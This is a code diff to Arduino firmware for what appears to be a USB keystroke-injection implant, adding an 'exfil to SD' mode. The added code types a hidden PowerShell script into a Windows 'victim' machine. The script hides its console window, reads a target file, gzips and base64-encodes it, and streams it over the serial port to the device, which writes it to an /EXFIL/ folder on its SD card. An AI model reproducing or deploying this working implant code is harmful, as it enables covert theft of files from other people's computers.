@@ -40,6 +40,7 @@ unsigned long elapsedMillis;
 // these must match what is in ihide.py or your devices will not communicate
 // default values have been added below for out-of-the-box functionality
 // WARNING: if you do not change these variables, an attacker can potentially detect and hijack your implant
+
 String activatePW = "DEFAULTactivatePW";            //password for activating implant functions                             - main menu option 3
 String getModesPW = "DEFAULTgetModesPW";            //password for retrieving the status of insomnia and key recorder modes - main menu option 4
 String recKeysEnablePW = "DEFAULTrecKeysEnablePW";  //password for enabling keystroke recording                             - main menu option 8
@@ -75,6 +76,9 @@ bool sendKeyFile = false;
 bool terminalMode = false;
 bool exfilMode = false;
 bool exfilStartVar = false;
+bool exfilModeSD = false;
+bool exfilStartVarSD = false;
+String stringOne = "";
 String incoming = "";
 String incoming1 = "";
 String incoming2 = "";
@@ -138,6 +142,20 @@ void loop() {
         Serial1.print(incoming1);        
       }
     }
+    
+              if (exfilModeSD) {
+        exfilStartVarSD = false;
+        if (Serial.available() > 0) {
+        
+        incoming1 = Serial.readString();
+        stringOne += incoming1;
+        if (incoming1 == "~<<<EOF>>>") {
+         //Save to SD
+         saveExfilSD("test.txt",stringOne); 
+        }   
+      }
+    }
+    
  
 #ifdef Serial
   if (Serial.available() > 0) {
@@ -392,7 +410,18 @@ void setMode(String pass){
       exfilStart(pass);
       Serial1.flush();
       }
-
+        else if (pass == exfilPWSD){
+    // launch a powershell script that allows remote file browsing and exfil to C2 of files on a windows victim
+    Serial.println("EXFIL SD ON");
+    exfilStartVarSD = true;
+    Serial1.flush();
+    }
+       else if (exfilStartVarSD == true) {
+      exfilStartVarSD = false;
+      exfilStartSD(pass);
+      Serial1.flush();
+      }
+    
    else if (pass == exfilPWOFF){
     // exit gracefully from exfil mode if the function crashes or the user CTRL+C
     Serial.println("EXFIL OFF");
@@ -467,6 +496,36 @@ inject("dl-500");
   Serial1.flush();
 
 }
+
+void exfilStartSD (String n) {
+exfilStartVarSD = false;
+inject("ps-LEFT_GUI");
+inject("dl-250");
+inject("ra-");
+inject("dl-1000");
+inject("pt-powershell.exe");
+inject("dl-250");
+inject("ps-RETURN");
+inject("ra-");
+inject("dl-1000");
+  String exfilHide = "pt-Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")] public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);';function Hide-Console {$consolePtr = [Console.Window]::GetConsoleWindow();[Console.Window]::ShowWindow($consolePtr, 0)};";
+  String exfilCode = "pt-$ports = Get-WMIObject Win32_SerialPort| Where-Object PNPDeviceID -Like \"USB\\VID_2341&PID_8057&MI_01\\*\"| Select-Object -ExpandProperty DeviceID;$port= new-Object System.IO.Ports.SerialPort $ports,115200,None,8,one;$port.Open();$file = \""+n+"\";$data = Get-Content \"$file\" -Encoding Byte;[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream;$gzipStream = New-Object System.IO.Compression.GZipStream $output,([IO.Compression.CompressionMode]::Compress);$gzipStream.Write($data, 0 , $data.Length);$gzipStream.Close();$output.Close();$encodedData = [Convert]::ToBase64String($output.ToArray());$array = $encodedData -split '(.{100})' | ? {$_};Hide-Console;while($port.IsOpen){  if($array -isnot [system.array]){$port.Write(\"~\"+$array);Start-Sleep -S 9;$port.Write(\"~<<<EOF>>>\");$port.Close();break;} else {  for ($i=0; $i -lt $array.length; $i++) {$data1 = $port.ReadExisting();$data2 = [string]::join(\"\",($data1.Split(\"`n\")));$data = [string]::join(\"\",($data2.Split(\"`r\")));$max = $array.Count;if ($i -eq 0) {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf ($data -eq \"\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf  ($data -eq \"P\") {$port.Write(\"~\"+$array[$i]);Start-Sleep -S 1;}ElseIf  ($data -ne \"P\") {$i--;$port.Write(\"~@\");Start-Sleep -S 2;}ElseIf ($i -eq $max) {Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}Start-Sleep -S 5;$port.Write(\"~<<<EOF>>>\");$port.Close();break;}}";
+  inject(exfilHide);
+  delay(1000);
+  inject("ps-RETURN");
+  inject(exfilCode);
+  delay(5000);
+  inject("dl-250");
+  inject("ps-RETURN");
+  inject("ra-");
+  exfilModeSD = true;
+  inject("ps-RETURN");
+  inject("ra-");
+  exfilStartVarSD = false;
+  Serial1.flush();
+
+}
+
 
 //
 // recordKeys() writes recorded keystrokes to SDCard/Data/keys.txt when keystroke recording is enabled
@@ -660,6 +719,27 @@ void saveScript(String n, String s){
     }
     myFile.close();
   }
+}
+
+//
+// saveExfilSD() writes a received exfil file to /EXFIL/ directory on the SD card
+//
+
+void saveExfilSD(String n, String s){
+  Serial.println("attempting exfil SD save");
+  if (SD.exists("/EXFIL/") == false){
+    SD.mkdir("/EXFIL/");
+  }
+  String path = "/EXFIL/" + n;
+  Serial.print("The file path is: ");
+  Serial.println(path);
+  Serial.println(s);
+    File myFile = SD.open(path, FILE_WRITE);
+    if (myFile) {
+      myFile.println(s);
+    }
+    myFile.close();
+    exfilModeSD = false;
 }
 
 //
